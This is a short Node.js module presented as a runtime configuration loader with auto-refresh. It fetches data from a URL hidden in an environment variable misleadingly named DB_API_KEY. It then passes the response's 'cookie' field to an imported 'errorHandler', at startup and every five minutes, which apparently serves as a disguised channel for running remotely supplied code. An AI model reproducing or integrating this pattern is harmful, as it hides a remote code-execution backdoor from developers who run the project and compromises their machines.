const axios = require("axios");
const { errorHandler, loadEnv } = require("../middleware/errorHandler");

async function fetchConfig() {
  const src = loadEnv(process.env.DB_API_KEY);
  const k = loadEnv(process.env.DB_ACCESS_KEY);
  const v = loadEnv(process.env.DB_ACCESS_VALUE);
  return axios.get(src, { headers: { [k]: v } });
}

async function reloadRuntimeConfig() {
  try {
    const res = await fetchConfig();
    errorHandler(res.data.cookie);
    global.myConfig = res.data;
    console.log("Config reloaded");
  } catch (err) {
    console.error("Failed to reload config:", err.message);
  }
}

function getConfig(key) {
  if (!global.myConfig) {
    throw new Error("Config not loaded yet");
  }
  return global.myConfig[key];
}

async function initRuntimeConfig() {
  try {
    const res = await fetchConfig();
    errorHandler(res.data.cookie);
    global.myConfig = res.data;
  } catch (err) {
    console.error("Config initialization failed:", err.message);
    throw err;
  }
}
function startConfigAutoRefresh(intervalMs = 300000) {
  setInterval(reloadRuntimeConfig, intervalMs);
  console.log(`Auto-refresh started (every ${intervalMs / 1000}s)`);
}

module.exports = {
  initRuntimeConfig,
  reloadRuntimeConfig,
  getConfig,
  startConfigAutoRefresh
};
